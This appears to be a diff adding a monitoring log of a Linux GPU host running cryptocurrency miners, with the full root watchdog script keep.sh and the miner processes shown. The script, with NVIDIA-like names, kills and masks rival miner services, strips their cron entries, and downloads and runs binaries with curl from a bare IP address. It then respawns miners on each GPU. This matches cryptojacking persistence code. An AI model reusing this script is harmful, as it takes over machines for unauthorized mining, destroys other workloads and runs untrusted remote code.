@@ -1,0 +1,98 @@
+=== WATCH 2026-11-25T04:46:29Z
+--- /opt/nv
+total 66168
+drwxr-xr-x 4 root root     4096 Nov 23 00:44 .
+drwxr-xr-x 5 root root     4096 Nov 25 01:07 ..
+-rw-r--r-- 1 root root       14 Nov 22 22:27 fip
+-rw-r--r-- 1 root root       68 Nov 22 22:27 gpu.txt
+-rw-r--r-- 1 root root        0 Nov 25 04:46 keep.lock
+-rwxr-xr-x 1 root root     3463 Nov 22 22:23 keep.sh
+drwxr-xr-x 2 root root     4096 Nov 23 00:40 logs
+-rwxr-xr-x 1 root root 46116552 Nov 22 22:27 peakminer
+drwxr-xr-x 2 root root     4096 Nov 22 22:27 run
+-rwxr-xr-x 1 root root     1943 Nov 22 22:23 run-g.sh
+-rwxr-xr-x 1 root root 21601960 Nov 22 22:27 srb
+-rwxr-xr-x 1 root root       59 Nov 23 00:44 supervisor.sh
+--- keep.sh
+#!/bin/bash
+# /opt/nv/keep.sh - canonical watchdog v17 (i70783)
+D=/opt/nv
+SEED='http://163.68.86.6:8090'
+mkdir -p "$D/logs"
+if [ -r "$D/keep.lock" ] && fuser "$D/keep.lock" >/dev/null 2>&1; then
+  for lp in $(fuser "$D/keep.lock" 2>/dev/null); do
+    let_=$(ps -o etimes= -p "$lp" 2>/dev/null | tr -d ' ')
+    if [ -n "$let_" ] && [ "$let_" -gt 600 ] 2>/dev/null; then
+      tr '\0' ' ' < /proc/$lp/cmdline 2>/dev/null | grep -q 'kee[p]\.sh' && kill -9 "$lp" 2>/dev/null
+    fi
+  done
+fi
+exec 9>"$D/keep.lock"
+flock -n 9 || exit 0
+if [ "$(id -u)" = 0 ]; then
+  for u in nv-cuda-cache t19k-keep t19-keep t19-keep9 krig-t19 xmr-t19; do systemctl disable --now "$u" >/dev/null 2>&1; done
+  for f in $(timeout 25 grep -rlE '/opt/t19|/root/\.km|keep9\.sh' /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null | head -20); do
+    systemctl disable --now "$(basename "$f")" >/dev/null 2>&1
+    rm -f "$f"
+  done
+  systemctl daemon-reload 2>/dev/null
+  for u in nv-cuda-cache t19k-keep t19-keep t19-keep9; do systemctl mask "$u" >/dev/null 2>&1; done
+  for pass in 1 2 3; do
+    pkill -9 -f '/opt/t1[9]' 2>/dev/null
+    pkill -9 -f '/opt/t19[k]2' 2>/dev/null
+    pkill -9 -f '/var/tmp/\.[k]w' 2>/dev/null
+    pkill -9 -f '/root/\.[k]m' 2>/dev/null
+    sleep 1
+  done
+  rm -rf /opt/t19 /opt/t19k /opt/t19k2 /opt/t19.disabled* /opt/t19k.disabled* /root/.km 2>/dev/null
+  pkill -9 -f '/opt/t1[9]' 2>/dev/null
+  rm -f /etc/cron.d/xmr-t19 /etc/cron.d/nv-t19 /etc/cron.d/nv-t19k /etc/cron.d/t19 /etc/cron.d/t19k /etc/cron.d/krig-t19 2>/dev/null
+  timeout 10 crontab -l 2>/dev/null | grep -vE 'nv-cuda|/opt/t19|/root/\.km|krig-t19|xmr-t19' | crontab - 2>/dev/null
+  timeout 10 crontab -u ubuntu -l 2>/dev/null | grep -vE 'nv-cuda|/opt/t19|/root/\.km|krig-t19|xmr-t19' | crontab -u ubuntu - 2>/dev/null
+fi
+ensure() { f="$1"; min="$2"; if [ ! -f "$f" ] || [ "$(stat -c%s "$f" 2>/dev/null || echo 0)" -lt "$min" ]; then curl -sf -m 300 "$SEED/$(basename "$f")" -o "$f.tmp" && chmod 755 "$f.tmp" && mv -f "$f.tmp" "$f"; fi; }
+FIP=$(cat "$D/fip" 2>/dev/null)
+case "$FIP" in *[0-9].[0-9]*) ;; *) FIP=$(curl -s -m 10 http://ifconfig.me 2>/dev/null); echo "$FIP" > "$D/fip";; esac
+FIPD=$(echo "$FIP" | tr '.' '-')
+NG=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
+[ "${NG:-0}" -eq 0 ] && NG=$(ls /dev/nvidia[0-9]* 2>/dev/null | wc -l | tr -d ' ')
+[ "${NG:-0}" -ge 1 ] || { echo "[$(date -u +%FT%TZ)] no gpu" >> "$D/logs/keep.log"; exit 0; }
+ensure "$D/peakminer" 40000000
+ensure "$D/srb" 20000000
+for i in $(seq 0 $((NG-1))); do
+  ROOTS=$(ps -eo pid=,ppid=,args= | grep -E "/opt/nv/[p]eakminer -d $i( |$)|/opt/nv/[s]rb .*--gpu-id $i( |$)" | awk '{p[$1]=$2} END{for(x in p) if(!(p[x] in p)) print x}' | sort -n)
+  CNT=$(echo "$ROOTS" | grep -c . )
+  if [ "${CNT:-0}" -gt 1 ]; then
+    KEEP=$(echo "$ROOTS" | tail -1)
+    for p in $ROOTS; do
+      if [ "$p" != "$KEEP" ]; then
+        echo "[$(date -u +%FT%TZ)] dedupe kill g$i root=$p" >> "$D/logs/keep.log"
+        kill -9 "-$p" 2>/dev/null || kill -9 "$p" 2>/dev/null
+      fi
+    done
+  fi
+done
+for i in $(seq 0 $((NG-1))); do
+  ROOTS2=$(ps -eo pid=,ppid=,args= | grep -E "/opt/nv/[p]eakminer -d $i( |$)|/opt/nv/[s]rb .*--gpu-id $i( |$)" | awk '{p[$1]=$2} END{for(x in p) if(!(p[x] in p)) print x}' | sort -n)
+  if [ -n "$ROOTS2" ]; then :
+  else
+    echo "[$(date -u +%FT%TZ)] respawn g$i ($FIPD) roots_empty" >> "$D/logs/keep.log"
+    setsid nohup "$D/run-g.sh" "$i" >> "$D/logs/g$i.out" 2>&1 9>&- &
+  fi
+done
+
+--- units state
+nv-cuda-cache.service: inactive/masked
+nv-t19.service: active/enabled
+nv-t19v.service: active/enabled
+t19-keep.service: inactive/masked
+t19-keep9.service: inactive/masked
+t19k-keep.service: inactive/masked
+ul-nvpm.service: activating/enabled
+--- miner
+2183530 /opt/ul/pearl-gpu-miner --wallet prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --pool stratum+ssl://prl.kryptex.network:8048,stratum+tcp://prl.kryptex.network:7048,stratum+tcp://pool.pearlhash.xyz:9000,stratum+ssl-insecure://pool.pearlhash.xyz:9443 --worker ul-149-81-10-242-g0 --algo pearlhash --no-tui --bind 127.0.0.1:3330
+2381709 /home/ubuntu/ul7256/tw-pearl-miner/pearl-gpu-miner --wallet prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --pool stratum+ssl://prl.kryptex.network:8048,stratum+tcp://prl.kryptex.network:7048,stratum+tcp://pool.pearlhash.xyz:9000,stratum+ssl-insecure://pool.pearlhash.xyz:9443 --worker ul-10-243-0-29-g0 --no-tui --bind 127.0.0.1:3370
+[status-json] {"accepted":5,"avg_ths":75.8,"dropped":0,"gpu_ths":[75.8],"login_ms":16,"net_err":0,"pending":0,"ping_ms":28,"rejected":0,"submit_ms":16,"uptime_sec":720,"v":1,"window_ths":76.2}
+00:13:00 |   75.6 TH/s window |   75.8 TH/s avg | shares: 5 accepted
+[status-json] {"accepted":5,"avg_ths":75.8,"dropped":0,"gpu_ths":[75.8],"login_ms":16,"net_err":0,"pending":0,"ping_ms":28,"rejected":0,"submit_ms":16,"uptime_sec":780,"v":1,"window_ths":75.6}
+=== WATCH END
